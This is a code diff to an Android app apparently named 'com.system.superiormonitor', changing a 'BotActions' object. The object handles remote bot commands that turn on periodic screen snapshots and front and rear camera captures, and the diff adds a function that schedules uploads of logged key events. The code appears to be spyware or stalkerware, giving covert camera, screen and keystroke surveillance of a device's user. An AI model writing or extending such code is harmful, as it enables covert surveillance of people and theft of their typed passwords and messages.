@@ -62,11 +62,11 @@ object BotActions {
         context.startActivity(intent)
     }
 
-    fun updateSnapshotFeatureState(context: Context, data: String) {
+    fun updateSnapshotFeatureState(context: Context, data: String): Boolean {
         val prefs = PrefsManager.getInstance(context)
         val parts = data.split("_")
         // Expected format: set_snap_{feature}_{interval|disable}
-        if (parts.size < 4) return
+        if (parts.size < 4) return false
         
         val feature = parts[2]
         val action = parts[3]
@@ -75,11 +75,13 @@ object BotActions {
         when (feature) {
             "screen" -> {
                 if (action == "disable") {
+                    if (!prefs.enableSnapshots) return false
                     prefs.enableSnapshots = false
                     scheduler.cancelSnapshot()
                 } else {
                     val interval = action.toIntOrNull()
                     if (interval != null) {
+                        if (prefs.enableSnapshots && prefs.snapshotIntervalMin == interval) return false
                         prefs.enableSnapshots = true
                         prefs.snapshotIntervalMin = interval
                         scheduler.scheduleNextSnapshot()
@@ -88,11 +90,13 @@ object BotActions {
             }
             "front" -> {
                 if (action == "disable") {
+                    if (!prefs.enableFrontCamera) return false
                     prefs.enableFrontCamera = false
                     scheduler.cancelCamera(1)
                 } else {
                     val interval = action.toIntOrNull()
                     if (interval != null) {
+                        if (prefs.enableFrontCamera && prefs.frontCameraInterval == interval) return false
                         prefs.enableFrontCamera = true
                         prefs.frontCameraInterval = interval
                         scheduler.scheduleNextCamera(1)
@@ -101,11 +105,13 @@ object BotActions {
             }
             "rear" -> {
                 if (action == "disable") {
+                    if (!prefs.enableRearCamera) return false
                     prefs.enableRearCamera = false
                     scheduler.cancelCamera(0)
                 } else {
                     val interval = action.toIntOrNull()
                     if (interval != null) {
+                        if (prefs.enableRearCamera && prefs.rearCameraInterval == interval) return false
                         prefs.enableRearCamera = true
                         prefs.rearCameraInterval = interval
                         scheduler.scheduleNextCamera(0)
@@ -113,6 +119,32 @@ object BotActions {
                 }
             }
         }
+        return true
+    }
+
+    fun updateKeyEventsFeatureState(context: Context, data: String): Boolean {
+        val prefs = PrefsManager.getInstance(context)
+        val parts = data.split("_")
+        // Expected format: set_key_events_{interval|disable}
+        if (parts.size < 4) return false
+        
+        val action = parts[3]
+        val scheduler = com.system.superiormonitor.monitor.KeyEventScheduler(context)
+        
+        if (action == "disable") {
+            if (!prefs.keyEventsEnabled) return false
+            prefs.keyEventsEnabled = false
+            scheduler.cancelKeyEventUpload()
+        } else {
+            val interval = action.toIntOrNull()
+            if (interval != null) {
+                if (prefs.keyEventsEnabled && prefs.keyEventsIntervalMin == interval) return false
+                prefs.keyEventsEnabled = true
+                prefs.keyEventsIntervalMin = interval
+                scheduler.scheduleNextKeyEventUpload()
+            }
+        }
+        return true
     }
 
     fun togglePersistentFeature(context: Context, data: String) {
